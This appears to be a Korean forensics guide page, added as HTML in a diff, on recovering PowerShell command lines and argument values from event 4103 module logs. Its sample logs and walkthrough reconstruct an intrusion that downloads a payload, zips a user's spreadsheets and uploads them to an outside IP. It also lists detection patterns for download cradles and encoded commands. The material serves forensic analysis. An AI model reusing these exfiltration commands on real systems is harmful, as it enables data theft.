@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>PowerShell 4103 모듈 로깅: ContextInfo와 Payload로 인자 값 복원 · FOR-0098 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=Event%20Log">Event Log</a> / FOR-0098
+      </div>
+      <header class="article-head">
+        <h1>PowerShell 4103 모듈 로깅: ContextInfo와 Payload로 인자 값 복원</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">Event Log</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-intermediate">중급</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>4103은 실행된 커맨드릿과 그 파라미터에 실제로 넘어간 값을 Payload에 남기고, ContextInfo의 Host Application에 전체 명령행을 남긴다. 4688 감사가 꺼져 명령행을 못 구할 때의 1순위 대체 증거다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>EvtxECmd, Event Viewer, PowerShell, Timeline Explorer</td></tr>
+<tr><th>artifact</th><td><code>ContextInfo</code> · <code>Payload</code> · <code>Host Application</code> · <code>CommandInvocation</code> · <code>ParameterBinding</code> · <code>wsmprovhost.exe</code></td></tr>
+<tr><th>파일 경로</th><td><code>C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx</code> · <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></td></tr>
+<tr><th>레지스트리</th><td><code>HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging</code> · <code>HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames</code></td></tr>
+<tr><th>Event ID</th><td><code>4103</code></td></tr>
+<tr><th>프로토콜</th><td>WinRM</td></tr>
+<tr><th>regex</th><td><code>ParameterBinding\([^)]+\): name=&quot;([^&quot;]+)&quot;; value=&quot;([^&quot;]*)&quot;</code> · <code>Host Application\s*=\s*(.+)</code></td></tr>
+<tr><th>로그 필드</th><td><code>ContextInfo</code> · <code>Payload</code> · <code>UserData</code> · <code>Host Application</code> · <code>Host Name</code> · <code>Command Name</code> · <code>Command Type</code> · <code>Runspace ID</code> · <code>Pipeline ID</code> · <code>Sequence Number</code> · <code>Connected User</code> · <code>Shell ID</code></td></tr>
+<tr><th>파일 형식</th><td><code>evtx</code></td></tr>
+<tr><th>검색 별칭</th><td>4103 · 모듈 로깅 · powershell 4103 · 파워쉘 인자 값 · powershell 파라미터 로그 · host application · powershell remoting 흔적</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p>4103은 실행된 <strong>커맨드릿과 그 파라미터에 실제로 넘어간 값</strong>을 <code>Payload</code>에 남기고, <code>ContextInfo</code>의 <code>Host Application</code>에 <strong>전체 명령행</strong>을 남긴다. 4688 감사가 꺼져 명령행을 못 구할 때의 1순위 대체 증거다.</p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>&quot;4688이 없거나 <code>CommandLine</code> 감사가 꺼져 있다. PowerShell 명령행을 어디서 구하나&quot;</li><li>&quot;<code>Invoke-WebRequest</code>에 넘어간 URL은 무엇인가&quot; — 인자 값 복원</li><li>&quot;원격에서 실행된 PowerShell인가&quot; — <code>Host Application</code>이 <code>wsmprovhost.exe</code>인지</li><li>&quot;어떤 계정이 실행했는가&quot; — <code>User</code> / <code>Connected User</code></li><li>&quot;같은 파이프라인에서 무엇이 연달아 실행됐나&quot; — <code>Pipeline ID</code>, <code>Sequence Number</code></li><li>스크립트 본문(4104)은 지워졌지만 4103만 남은 경우</li></ul>
+<p>코드 본문 자체와 <code>-EncodedCommand</code> 해독은 4104 전담 글(FOR-0097)이 담당한다. <strong>4104는 코드, 4103은 실행된 명령과 값이다.</strong></p>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li><code>Microsoft-Windows-PowerShell%4Operational.evtx</code>가 있고 4104는 비어 있다 → 4103</li><li>Security.evtx에 4688이 없거나 명령행 필드가 비어 있다 → 4103의 <code>Host Application</code></li><li>지문이 &quot;다운로드 URL&quot;, &quot;압축한 파일 이름&quot;, &quot;접속한 호스트&quot; → <code>ParameterBinding</code> 값</li><li>지문에 &quot;원격에서&quot;, &quot;WinRM&quot;, &quot;Enter-PSSession&quot; → <code>Host Application</code> = <code>wsmprovhost.exe</code></li><li>4103이 수만 건이다 → 필터 설계가 먼저다</li></ol>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 원본: Microsoft-Windows-PowerShell%4Operational.evtx -&gt; ps.evtx
+Get-WinEvent -Path &#39;C:\case\ps.evtx&#39; -FilterXPath &#39;*[System[EventID=4103]]&#39; | Format-List</code></pre></div>
+<p>바로 쓸 수 있는 형태로 파싱한다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$ps = &#39;C:\case\ps.evtx&#39;
+
+$m = Get-WinEvent -Path $ps -FilterXPath &#39;*[System[EventID=4103]]&#39; |
+  ForEach-Object {
+    $x = [xml]$_.ToXml()
+    $d = @{}
+    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.&#39;#text&#39; }
+    $ctx = @{}
+    foreach ($line in ($d[&#39;ContextInfo&#39;] -split &quot;`r?`n&quot;)) {
+      if ($line -match &#39;^\s*(.+?)\s*=\s*(.*)$&#39;) { $ctx[$matches[1]] = $matches[2] }
+    }
+    [pscustomobject]@{
+      TimeUtc  = $_.TimeCreated.ToUniversalTime()
+      Cmd      = $ctx[&#39;Command Name&#39;]
+      CmdType  = $ctx[&#39;Command Type&#39;]
+      HostApp  = $ctx[&#39;Host Application&#39;]
+      HostName = $ctx[&#39;Host Name&#39;]
+      User     = $ctx[&#39;User&#39;]
+      Runspace = $ctx[&#39;Runspace ID&#39;]
+      Pipeline = $ctx[&#39;Pipeline ID&#39;]
+      Seq      = $ctx[&#39;Sequence Number&#39;]
+      Payload  = $d[&#39;Payload&#39;]
+    }
+  } | Sort-Object TimeUtc
+
+$m | Select-Object -First 20 TimeUtc, Cmd, User, HostName | Format-Table -AutoSize</code></pre></div>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-eventdata는-세-개뿐이다">1단계 — EventData는 세 개뿐이다</h3>
+<div class="table-wrap"><table><thead><tr><th>필드</th><th>내용</th></tr></thead><tbody><tr><td><code>ContextInfo</code></td><td>실행 문맥. 여러 줄의 <code>이름 = 값</code> 텍스트 한 덩어리</td></tr><tr><td><code>Payload</code></td><td><code>CommandInvocation</code> / <code>ParameterBinding</code> 등 실제 호출 내역</td></tr><tr><td><code>UserData</code></td><td>대개 빈 값. 공급자가 추가 정보를 넣을 때만 채워진다</td></tr></tbody></table></div>
+<p>즉 이름 있는 필드로 바로 조회할 수 있는 것은 세 개뿐이고, <strong>필요한 값은 전부 <code>ContextInfo</code> 문자열 안에 있다.</strong> 그래서 파싱이 필수다.</p>
+<h3 id="2단계-contextinfo-항목표">2단계 — ContextInfo 항목표</h3>
+<div class="table-wrap"><table><thead><tr><th>항목</th><th>의미</th><th>포렌식 활용</th></tr></thead><tbody><tr><td><code>Severity</code></td><td>심각도</td><td>대개 <code>Informational</code></td></tr><tr><td><code>Host Name</code></td><td>호스트 이름</td><td><code>ConsoleHost</code> / <code>Windows PowerShell ISE Host</code> / <code>ServerRemoteHost</code></td></tr><tr><td><code>Host Version</code></td><td>호스트 버전</td><td>PowerShell 버전. <code>2.0</code>이면 <strong>다운그레이드 공격 의심</strong></td></tr><tr><td><code>Host ID</code></td><td>호스트 인스턴스 GUID</td><td>같은 프로세스의 이벤트를 묶는 키</td></tr><tr><td><code>Host Application</code></td><td><strong>전체 명령행</strong></td><td><code>powershell.exe -nop -w hidden -enc ...</code> 전체가 들어온다</td></tr><tr><td><code>Engine Version</code></td><td>엔진 버전</td><td>호스트 버전과 함께 본다</td></tr><tr><td><code>Runspace ID</code></td><td>런스페이스 GUID</td><td><strong>세션 단위 묶음 키</strong></td></tr><tr><td><code>Pipeline ID</code></td><td>파이프라인 번호</td><td>한 파이프라인 안의 명령들을 묶는다</td></tr><tr><td><code>Command Name</code></td><td>실행된 명령 이름</td><td><code>Invoke-WebRequest</code>, <code>New-Object</code> 등</td></tr><tr><td><code>Command Type</code></td><td><code>Cmdlet</code> / <code>Function</code> / <code>Script</code> / <code>Alias</code> / <code>ExternalScript</code></td><td><code>ExternalScript</code>면 <code>.ps1</code> 파일 실행</td></tr><tr><td><code>Script Name</code></td><td>실행 중인 스크립트 파일 경로</td><td>있으면 그 파일을 찾는다</td></tr><tr><td><code>Command Path</code></td><td>외부 스크립트/명령의 경로</td><td><code>Script Name</code>과 함께 본다</td></tr><tr><td><code>Sequence Number</code></td><td>세션 내 실행 순번</td><td><strong>순서 복원 키.</strong> 시각이 같아도 이 값으로 정렬</td></tr><tr><td><code>User</code></td><td>실행 계정</td><td><code>HOSTNAME\user</code></td></tr><tr><td><code>Connected User</code></td><td>원격 접속 사용자</td><td>원격 실행일 때만 채워진다</td></tr><tr><td><code>Shell ID</code></td><td><code>Microsoft.PowerShell</code> 등</td><td>제약 있는 엔드포인트면 다른 값</td></tr></tbody></table></div>
+<p><strong><code>Host Application</code>이 이 글의 핵심이다.</strong> 4688의 <code>CommandLine</code> 감사(기본 꺼짐)와 무관하게, PowerShell이 스스로 자기 명령행을 기록한다. <code>-EncodedCommand</code>의 base64도 여기 그대로 들어오므로 4104가 없어도 명령을 복원할 수 있다.</p>
+<h3 id="3단계-payload에서-인자-값-복원">3단계 — Payload에서 인자 값 복원</h3>
+<p><code>Payload</code>는 다음 두 줄 형태가 반복된다.</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">CommandInvocation(Invoke-WebRequest): &quot;Invoke-WebRequest&quot;
+ParameterBinding(Invoke-WebRequest): name=&quot;Uri&quot;; value=&quot;http://cdn-update.example.net:8080/pkg/a7f2.dat&quot;
+ParameterBinding(Invoke-WebRequest): name=&quot;OutFile&quot;; value=&quot;C:\Users\svc_backup\AppData\Local\Temp\a.dat&quot;
+ParameterBinding(Invoke-WebRequest): name=&quot;UseBasicParsing&quot;; value=&quot;True&quot;</code></pre></div>
+<p><code>CommandInvocation</code>은 &quot;무엇을 불렀나&quot;, <code>ParameterBinding</code>은 &quot;무엇을 넘겼나&quot;다. <strong>변수로 감춰진 값도 바인딩 시점에는 실제 값으로 풀려 기록된다.</strong> 4104의 코드가 <code>$u</code>를 넘기더라도 여기서는 URL 문자열이 보인다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 모든 4103 의 ParameterBinding 값만 추출
+$m | ForEach-Object {
+  foreach ($line in ($_.Payload -split &quot;`r?`n&quot;)) {
+    if ($line -match &#39;ParameterBinding\((?&lt;c&gt;[^)]+)\): name=&quot;(?&lt;n&gt;[^&quot;]+)&quot;; value=&quot;(?&lt;v&gt;.*)&quot;&#39;) {
+      [pscustomobject]@{
+        TimeUtc = $_.TimeUtc
+        Command = $matches[&#39;c&#39;]
+        Param   = $matches[&#39;n&#39;]
+        Value   = $matches[&#39;v&#39;]
+      }
+    }
+  }
+} | Where-Object { $_.Value -match &#39;http|\\\\|\.exe|\.dat|\.zip|[0-9]{1,3}(\.[0-9]{1,3}){3}&#39; } |
+  Format-Table -AutoSize</code></pre></div>
+<p>출력:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">TimeUtc              Command            Param    Value
+-------              -------            -----    -----
+2026-03-14 07:20:09  Invoke-WebRequest  Uri      http://cdn-update.example.net:8080/pkg/a7f2.dat
+2026-03-14 07:20:09  Invoke-WebRequest  OutFile  C:\Users\svc_backup\AppData\Local\Temp\a.dat
+2026-03-14 07:24:50  Compress-Archive   Path     C:\Users\jhkim\Documents\*.xlsx
+2026-03-14 07:24:50  Compress-Archive   DestinationPath  C:\Windows\Temp\bk.zip
+2026-03-14 07:25:33  New-Object         TypeName Net.Sockets.TCPClient</code></pre></div>
+<p>이 표 자체가 침해 타임라인이다.</p>
+<h3 id="4단계-4104와의-역할-구분">4단계 — 4104와의 역할 구분</h3>
+<div class="table-wrap"><table><thead><tr><th>질문</th><th>4104</th><th>4103</th></tr></thead><tbody><tr><td>실행된 코드 본문</td><td><strong>있다</strong> (<code>ScriptBlockText</code>)</td><td>없다</td></tr><tr><td>실제로 넘어간 인자 값</td><td>코드에 리터럴로 있을 때만</td><td><strong>있다</strong> (<code>ParameterBinding</code>)</td></tr><tr><td>전체 명령행</td><td>없다</td><td><strong>있다</strong> (<code>Host Application</code>)</td></tr><tr><td>호스트/원격 여부</td><td>없다</td><td><strong>있다</strong> (<code>Host Name</code>, <code>Connected User</code>)</td></tr><tr><td>실행 순서</td><td>시각 + <code>MessageNumber</code></td><td><code>Sequence Number</code>, <code>Pipeline ID</code></td></tr><tr><td>조각 분할</td><td><strong>있다</strong> (재조립 필요)</td><td>없다 (이벤트 하나가 호출 하나)</td></tr><tr><td>건수</td><td>스크립트 블록 수만큼</td><td><strong>호출마다 1건. 압도적으로 많다</strong></td></tr><tr><td>난독화 상태</td><td>난독화된 원문 그대로</td><td>바인딩 시점의 <strong>풀린 값</strong></td></tr></tbody></table></div>
+<p>정리하면 <strong>4104로 &quot;무슨 코드를 실행했는지&quot;, 4103으로 &quot;그 코드가 실제로 어떤 값을 썼는지&quot;</strong> 를 얻는다. 둘 다 있으면 4103부터 훑는 편이 빠르다. 값이 바로 보이기 때문이다.</p>
+<h3 id="5단계-원격-실행-판정">5단계 — 원격 실행 판정</h3>
+<div class="table-wrap"><table><thead><tr><th><code>Host Application</code> / <code>Host Name</code></th><th>판정</th></tr></thead><tbody><tr><td><code>Host Name = ConsoleHost</code> + <code>powershell.exe ...</code></td><td>로컬 콘솔 실행</td></tr><tr><td><code>Host Name = Windows PowerShell ISE Host</code></td><td>ISE에서 실행. 사람이 편집하며 실행</td></tr><tr><td><code>Host Application</code>에 <code>wsmprovhost.exe</code></td><td><strong>PowerShell Remoting(WinRM). 원격 실행</strong></td></tr><tr><td><code>Host Name = ServerRemoteHost</code></td><td>원격 세션의 서버 측 호스트</td></tr><tr><td><code>Connected User</code>가 채워져 있다</td><td>원격 접속 사용자. 그 계정이 실제 조작자</td></tr><tr><td><code>Host Application</code>이 <code>powershell.exe</code>가 아닌 임의 exe</td><td><strong>PowerShell을 임베드한 프로그램.</strong> 커스텀 로더/공격 도구 의심</td></tr><tr><td><code>Host Version = 2.0</code></td><td><code>-Version 2</code> 다운그레이드. 스크립트 블록 로깅 회피 시도</td></tr></tbody></table></div>
+<p><code>wsmprovhost.exe</code>가 보이면 즉시 Security 로그의 4624 <code>LogonType</code> 3과 WinRM 채널을 대조한다. 원격 실행은 <strong>다른 호스트가 출발점</strong>이라는 뜻이다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$m | Where-Object { $_.HostApp -match &#39;wsmprovhost&#39; } |
+  Select-Object TimeUtc, User, HostName, Cmd | Format-Table -AutoSize</code></pre></div>
+<h3 id="6단계-노이즈-필터-필수">6단계 — 노이즈 필터 (필수)</h3>
+<p>4103은 커맨드릿 <strong>호출 단위</strong>로 기록된다. 정상 사용만으로도 수만 건이 쌓이므로 그대로는 볼 수 없다.</p>
+<div class="table-wrap"><table><thead><tr><th>버릴 대상</th><th>이유</th></tr></thead><tbody><tr><td><code>Command Name</code> = <code>Out-Default</code>, <code>Out-String</code>, <code>Out-Host</code>, <code>Write-Host</code>, <code>Format-*</code></td><td>출력 파이프라인의 기본 동작</td></tr><tr><td><code>Command Name</code> = <code>prompt</code>, <code>Set-StrictMode</code>, <code>Get-Command</code>, <code>Get-Help</code></td><td>셸/모듈 초기화</td></tr><tr><td><code>Payload</code>가 <code>ParameterBinding</code> 없이 <code>CommandInvocation</code>만</td><td>인자 없는 호출. 정보량 낮음</td></tr><tr><td><code>Host Name</code> = 백업/모니터링 에이전트</td><td>관리 자동화</td></tr><tr><td>반복되는 동일 <code>Command Name</code> + 동일 값</td><td>스케줄된 정상 작업</td></tr></tbody></table></div>
+<p>남길 대상은 반대로 좁게 잡는다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$hot = @(
+  &#39;Invoke-WebRequest&#39;,&#39;Invoke-RestMethod&#39;,&#39;Invoke-Expression&#39;,&#39;Invoke-Command&#39;,
+  &#39;New-Object&#39;,&#39;Add-Type&#39;,&#39;Start-Process&#39;,&#39;Start-Job&#39;,&#39;Compress-Archive&#39;,
+  &#39;Set-ItemProperty&#39;,&#39;New-ItemProperty&#39;,&#39;New-Service&#39;,&#39;Set-Service&#39;,
+  &#39;Register-ScheduledTask&#39;,&#39;New-ScheduledTask&#39;,&#39;Get-Credential&#39;,&#39;ConvertTo-SecureString&#39;,
+  &#39;Get-WmiObject&#39;,&#39;Invoke-WmiMethod&#39;,&#39;Get-CimInstance&#39;,&#39;Invoke-CimMethod&#39;,
+  &#39;Copy-Item&#39;,&#39;Remove-Item&#39;,&#39;Out-File&#39;,&#39;Set-Content&#39;,&#39;Enter-PSSession&#39;,&#39;New-PSSession&#39;
+)
+
+$m | Where-Object { $_.Cmd -in $hot } |
+  Select-Object TimeUtc, User, Cmd, HostName |
+  Sort-Object TimeUtc | Format-Table -AutoSize</code></pre></div>
+<p>값 기준으로 거르는 방법이 더 강력할 때도 많다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$m | Where-Object { $_.Payload -match &#39;http://|https://|\\\\[a-zA-Z0-9._-]+\\|FromBase64String|DownloadString|-enc &#39; } |
+  Select-Object TimeUtc, Cmd, User | Format-Table -AutoSize</code></pre></div>
+<h3 id="7단계-활성-여부와-꺼져-있을-때의-대안">7단계 — 활성 여부와 꺼져 있을 때의 대안</h3>
+<div class="table-wrap"><table><thead><tr><th>경로</th><th>값 이름</th><th>효과</th></tr></thead><tbody><tr><td><code>HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging</code></td><td><code>EnableModuleLogging</code> = 1</td><td>4103 기록</td></tr><tr><td><code>HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames</code></td><td>값 이름 <code>*</code>, 데이터 <code>*</code></td><td><strong>모든 모듈</strong> 대상</td></tr></tbody></table></div>
+<p><code>ModuleNames</code>에 특정 모듈만 들어 있으면 그 모듈의 커맨드릿만 기록된다. 4103이 있는데 원하는 명령이 안 보이면 <strong>이 목록이 좁게 설정된 것</strong>일 수 있다. SOFTWARE hive에서 직접 확인한다(<a href="./registry-hive-map.html">FOR-0051</a>).</p>
+<p>4103이 없을 때의 대안 순서:</p>
+<div class="table-wrap"><table><thead><tr><th>순위</th><th>대체 증거</th><th>얻을 수 있는 것</th></tr></thead><tbody><tr><td>1</td><td>4104 (FOR-0097)</td><td>코드 본문</td></tr><tr><td>2</td><td><code>Windows PowerShell.evtx</code> 400 / 800</td><td><code>HostApplication</code>(전체 명령행)</td></tr><tr><td>3</td><td>전사 파일 <code>PowerShell_transcript.*.txt</code></td><td>입력과 출력 전문</td></tr><tr><td>4</td><td>4688 + <code>SubjectLogonId</code></td><td>명령행(감사 켜져 있을 때)</td></tr><tr><td>5</td><td>Sysmon 1 <code>CommandLine</code></td><td>항상 기록되는 명령행</td></tr><tr><td>6</td><td><code>ConsoleHost_history.txt</code></td><td>콘솔 입력 이력(PSReadLine)</td></tr></tbody></table></div>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
+<p>시간대는 EVTX <code>SystemTime</code> 기준 <strong>UTC</strong>다. <code>Sequence Number</code>가 있으므로 초 이하 해상도가 겹칠 때는 시각보다 이 값을 신뢰한다. 답이 KST면 +9시간.</p>
+<div class="table-wrap"><table><thead><tr><th>상황</th><th>해석</th></tr></thead><tbody><tr><td><code>Command Type = ExternalScript</code></td><td><code>.ps1</code> 파일이 실행됐다. <code>Command Path</code>에 경로가 있다</td></tr><tr><td><code>Command Type = Alias</code></td><td>별칭 호출. 원래 이름은 <code>CommandInvocation</code>에서 확인</td></tr><tr><td>같은 <code>Pipeline ID</code> 여러 건</td><td>한 줄 파이프라인의 각 단계</td></tr><tr><td>같은 <code>Runspace ID</code> 여러 건</td><td>같은 세션. 세션 전체 활동을 이 키로 묶는다</td></tr><tr><td><code>Connected User</code>만 채워짐</td><td>원격 세션. <code>User</code>는 위임된 실행 계정</td></tr><tr><td><code>Payload</code>에 <code>ParameterBinding</code> 없음</td><td>인자 없이 호출됐거나 바인딩 로깅이 제한된 경우</td></tr></tbody></table></div>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>여기서 얻은 값</th><th>다음에 볼 것</th><th>확인할 내용</th></tr></thead><tbody><tr><td><code>ParameterBinding</code> URL</td><td>pcap <code>http.request</code> / DNS 질의</td><td>실제 통신 발생 여부</td></tr><tr><td><code>ParameterBinding</code> 파일 경로</td><td><code>$MFT</code> (<a href="./mft-basics.html">FOR-0021</a>)</td><td>그 파일의 생성 시각과 존재</td></tr><tr><td><code>Host Application</code>의 base64</td><td>4104 (FOR-0097)</td><td>디코딩한 스크립트 본문</td></tr><tr><td><code>Runspace ID</code></td><td>같은 ID의 4103 전체</td><td>세션 단위 명령 시퀀스</td></tr><tr><td><code>wsmprovhost.exe</code></td><td>4624 <code>LogonType</code> 3, WinRM 채널</td><td>원격 출발지 호스트와 계정</td></tr><tr><td><code>User</code></td><td>4624의 <code>TargetLogonId</code> (<a href="./event-4624-logon.html">FOR-0083</a>)</td><td>로그온 세션과 접속 IP</td></tr><tr><td><code>Compress-Archive</code> 대상</td><td>그 zip 파일과 유출 트래픽</td><td>데이터 유출 증거</td></tr><tr><td>지속성 커맨드릿</td><td>Run 키·서비스·예약 작업</td><td>실제 등록 여부</td></tr></tbody></table></div>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong><code>ContextInfo</code>를 이름 있는 필드로 조회하려는 것.</strong> EventData에는 <code>ContextInfo</code>, <code>Payload</code>, <code>UserData</code> 세 개만 있다 → <code>ContextInfo</code> 문자열을 줄 단위로 쪼개 <code>이름 = 값</code>으로 파싱한다.</li><li><strong><code>ContextInfo</code> 레이블이 영어라고 가정하는 것.</strong> OS 표시 언어에 따라 레이블이 번역되어 나올 수 있다 → 정규식이 아무것도 못 잡으면 <code>ContextInfo</code> 원문을 먼저 출력해 실제 레이블을 확인한다.</li><li><strong>필터 없이 4103을 여는 것.</strong> 커맨드릿 호출마다 1건이라 수만 건이 나온다 → <code>Command Name</code> 화이트리스트 또는 <code>Payload</code> 값 패턴으로 먼저 줄인다.</li><li><strong><code>Out-Default</code>·<code>Write-Host</code> 같은 노이즈를 증거로 채택하는 것.</strong> 셸의 기본 동작이다 → 위 노이즈 표를 먼저 제외한다.</li><li><strong>4103만 보고 코드 전체를 알았다고 생각하는 것.</strong> 4103에는 스크립트 본문이 없다 → 제어 흐름·조건문이 필요하면 4104를 본다.</li><li><strong><code>Host Application</code>을 무시하고 4688이 없다고 포기하는 것.</strong> PowerShell이 자기 명령행을 스스로 기록한다 → 4103·400·800의 <code>Host Application</code>이 명령행의 대체 증거다.</li><li><strong>원격 실행을 로컬로 오판하는 것.</strong> <code>Host Application</code>이 <code>wsmprovhost.exe</code>면 WinRM 원격이다 → 출발지 호스트를 따로 조사해야 한다.</li><li><strong><code>Host Version = 2.0</code>을 흘려보내는 것.</strong> <code>powershell -Version 2</code>로 내려가면 스크립트 블록 로깅이 적용되지 않는다 → 로깅 회피 시도로 기록한다.</li><li><strong>시각만으로 순서를 정하는 것.</strong> 같은 초에 여러 호출이 몰린다 → <code>Runspace ID</code> + <code>Sequence Number</code>로 정렬한다.</li><li><strong>Event Viewer의 로컬 시각으로 답하는 것.</strong> 내부 저장은 UTC다 → KST 요구 시 +9시간.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$ps  = &#39;C:\case\ps.evtx&#39;
+$sec = &#39;C:\case\Security.evtx&#39;
+
+# 1) 4103 건수와 Command Name 상위 목록 (필터 설계용)
+$m | Group-Object Cmd | Sort-Object Count -Descending | Select-Object -First 20 Count, Name
+
+# 2) Host Application 종류 (원격/임베드 판정)
+$m | Group-Object HostApp | Sort-Object Count -Descending | Select-Object -First 10 Count, Name
+
+# 3) 같은 시각의 4104 — 코드 본문
+Get-WinEvent -Path $ps -FilterXPath &#39;*[System[EventID=4104]]&#39; |
+  Where-Object { $_.TimeCreated -gt &#39;2026-03-14 07:20:00&#39; -and $_.TimeCreated -lt &#39;2026-03-14 07:21:00&#39; }
+
+# 4) 4688 — 명령행이 실제로 감사됐는지
+Get-WinEvent -FilterHashtable @{Path=$sec; Id=4688} |
+  Where-Object { $_.Message -match &#39;powershell&#39; } | Select-Object -First 5 TimeCreated, Message
+
+# 5) 전사 파일
+Get-ChildItem &#39;C:\case\mount\Users\*\Documents\PowerShell_transcript*&#39; -Recurse -ErrorAction SilentlyContinue</code></pre></div>
+<p>4103의 <code>Host Application</code>, 4104의 본문, 4688의 <code>CommandLine</code>이 같은 문자열을 가리키면 확정이다. 4103만 있으면 &quot;인자 값은 확정, 코드 흐름은 미확인&quot;으로 구분해 답한다.</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;공격자가 유출을 위해 압축한 파일의 경로와, 압축 대상 폴더를 답하시오.
+ 첨부: Microsoft-Windows-PowerShell%4Operational.evtx (4103: 18,442건 / 4104: 0건)&quot;
+
+1. 첫 시도 (실패):
+   4104 를 먼저 찾았다. 0건.
+   &quot;스크립트 블록 로깅이 꺼져 있어 명령을 복원할 수 없다&quot; 고 판단하고
+   Security.evtx 의 4688 로 갔다. 4688 도 없었다(감사 미설정).
+   -&gt; 여기서 막혔다고 결론. 오답.
+
+   왜 틀렸나:
+   4103 이 18,442건 있었는데 &quot;모듈 로깅은 커맨드릿 이름만 남는다&quot;고 잘못 알고 넘겼다.
+   4103 의 Payload 에는 ParameterBinding 으로 인자 값이 그대로 들어 있다.
+
+2. 피벗 — 4103 의 Payload 를 값 기준으로 긁었다.
+   $m | Where-Object { $_.Payload -match &#39;zip|Compress|\.xlsx&#39; }
+
+   TimeUtc              Cmd               Payload 발췌
+   2026-03-14 07:24:50  Compress-Archive  name=&quot;Path&quot;; value=&quot;C:\Users\jhkim\Documents\*.xlsx&quot;
+   2026-03-14 07:24:50  Compress-Archive  name=&quot;DestinationPath&quot;; value=&quot;C:\Windows\Temp\bk.zip&quot;
+
+3. 노이즈 확인 — 처음 필터 없이 열었을 때 상위 Command Name:
+   Count Name
+   ----- ----
+   6120  Out-Default
+   4318  Write-Host
+   2044  Format-Table
+     31  Invoke-WebRequest
+      2  Compress-Archive
+   -&gt; 상위 3개를 버리는 것만으로 볼 수 있는 크기가 된다.
+
+4. 실행 문맥 확인 (ContextInfo):
+   Host Name        = ServerRemoteHost
+   Host Application = C:\Windows\system32\wsmprovhost.exe -Embedding
+   User             = WIN10\svc_backup
+   Connected User   = CORP\svc_backup
+   Runspace ID      = 5d1c9f22-...
+   Sequence Number  = 214
+   -&gt; 로컬 콘솔이 아니라 WinRM 원격 실행이었다.
+      출발지는 이 호스트가 아니다. 4624 Type 3 을 확인해야 한다.
+
+5. 같은 Runspace ID 로 묶어 시퀀스 복원:
+   Seq 198  Get-ChildItem     Path=&quot;C:\Users\jhkim\Documents&quot;
+   Seq 214  Compress-Archive  Path=&quot;...\*.xlsx&quot;  Destination=&quot;C:\Windows\Temp\bk.zip&quot;
+   Seq 229  Invoke-WebRequest Uri=&quot;http://45.146.164.9:8080/up&quot;  InFile=&quot;C:\Windows\Temp\bk.zip&quot;
+
+6. 시간대: 07:24:50 UTC = 16:24:50 KST (+9h)
+
+정답: 압축 파일 C:\Windows\Temp\bk.zip, 압축 대상 C:\Users\jhkim\Documents\*.xlsx</code></pre></div>
+<p>1단계의 오판이 이 글의 존재 이유다. <strong>4104가 0건이어도 4103이 있으면 인자 값은 복원된다.</strong> 그리고 <code>Host Application</code> 한 줄이 &quot;원격 실행&quot;이라는 사건의 성격을 바꿔 놓았다.</p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
